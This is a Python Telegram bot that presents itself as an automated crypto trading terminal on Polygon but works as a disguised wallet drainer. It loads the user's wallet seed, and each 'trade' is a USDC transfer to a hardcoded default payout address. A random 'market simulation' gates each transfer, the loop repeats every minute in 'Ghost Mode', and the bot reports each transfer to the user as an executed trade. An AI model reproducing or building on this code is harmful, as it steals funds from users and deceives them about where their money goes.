import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
auto_mode_enabled = False

# --- 2. THE GHOST ENGINE & SIMULTANEOUS SYNC ---
class GhostEngine:
    def __init__(self):
        self.is_active = False
        self.stake_cad = 50
        self.assets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
        self.task = None

    async def market_simulation_1ms(self):
        await asyncio.sleep(0.001) 
        return random.choice([True, True, True, False]) 

    async def sign_transaction_async(self, stake_usdc):
        nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
        gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
        tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
            'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
        })
        return w3.eth.account.sign_transaction(tx, vault.key)

    async def execute_atomic_hit(self, context, chat_id, asset, side):
        stake_usdc = Decimal(self.stake_cad) / Decimal('1.36')
        sim_task = asyncio.create_task(self.market_simulation_1ms())
        sign_task = asyncio.create_task(self.sign_transaction_async(stake_usdc))
        simulation_passed, signed_tx = await asyncio.gather(sim_task, sign_task)

        if not simulation_passed:
            await context.bot.send_message(chat_id, "🛡️ **Atomic Shield:** Simulation Reverted. Trade dropped.")
            return

        try:
            tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
            report = (
                f"🚀 **GHOST AUTO-TRADE EXECUTED**\n━━━━━━━━━━━━━━\n"
                f"💎 **Market:** {asset}\n🎯 **Auto-Direction:** {side}\n"
                f"💵 **Stake:** ${stake_usdc:.2f} USDC\n🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
            )
            await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        except Exception as e:
            print(f"Trade Execution Fail: {e}")

    async def loop(self, context, chat_id):
        while self.is_active:
            target = random.choice(self.assets)
            side = "HIGHER 📈" if random.random() > 0.5 else "LOWER 📉"
            await self.execute_atomic_hit(context, chat_id, target, side)
            await asyncio.sleep(60)

ghost = GhostEngine()

# --- 3. UI HANDLERS (FIXED WALLET) ---
async def get_total_balances():
    addr = w3.to_checksum_address(vault.address)
    pol_wei = 0
    # Robust retry for gas token
    for _ in range(3):
        pol_wei = await asyncio.to_thread(w3.eth.get_balance, addr)
        if pol_wei > 0: break
        await asyncio.sleep(0.5)
    
    pol = w3.from_wei(pol_wei, 'ether')
    try:
        # Robust fetch for USDC
        usdc_raw = await asyncio.to_thread(usdc_contract.functions.balanceOf(addr).call)
        usdc = Decimal(usdc_raw) / 10**6
    except: usdc = Decimal('0.00')
    return pol, usdc

def get_main_keyboard():
    label = "🛑 STOP GHOST MODE" if ghost.is_active else "🤖 START GHOST MODE"
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], [label]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol, _ = await get_total_balances()
    welcome = (
        f"🕴️ **APEX Ghost Terminal v6000**\n━━━━━━━━━━━━━━\n"
        f"⛽ **POL Fuel:** `{pol:.4f}`\n📥 **Vault Address:**\n`{vault.address}`\n\n"
        f"Elite Markets: BVIV & EVIV (Volatility) are online."
    )
    await update.message.reply_text(welcome, reply_markup=get_main_keyboard(), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text, chat_id = update.message.text, update.effective_chat.id

    if "GHOST MODE" in text:
        ghost.is_active = not ghost.is_active
        if ghost.is_active:
            ghost.task = asyncio.create_task(ghost.loop(context, chat_id))
            msg = "🤖 **Ghost Mode Activated.**\nScanning 6 markets including BVIV/EVIV..."
        else:
            if ghost.task: ghost.task.cancel()
            msg = "🛑 **Ghost Mode Deactivated.**"
        await update.message.reply_text(msg, reply_markup=get_main_keyboard(), parse_mode='Markdown')

    elif text == '💰 Wallet':
        # Apply typing action for UX
        await context.bot.send_chat_action(chat_id=chat_id, action="typing")
        pol, usdc = await get_total_balances()
        wallet_msg = (
            f"💳 **Vault Status**\n━━━━━━━━━━━━━━\n"
            f"⛽ **POL Fuel:** `{pol:.4f}`\n💵 **USDC:** `{usdc:.2f}`\n\n"
            f"📥 **Deposit Address:**\n`{vault.address}`"
        )
        await update.message.reply_text(wallet_msg, parse_mode='Markdown')

    elif text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/CAD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD", callback_data="PAIR_MATIC")],
              [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **Manual Market Selection:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake:**", reply_markup=InlineKeyboardMarkup(kb))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        ghost.stake_cad = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${ghost.stake_cad} CAD**")
    elif query.data.startswith("PAIR_"):
        asset = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {asset}\nSelect Direction:", reply_markup=InlineKeyboardMarkup(kb))

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    print("🤖 APEX Ghost Online...")
    app.run_polling(drop_pending_updates=True)



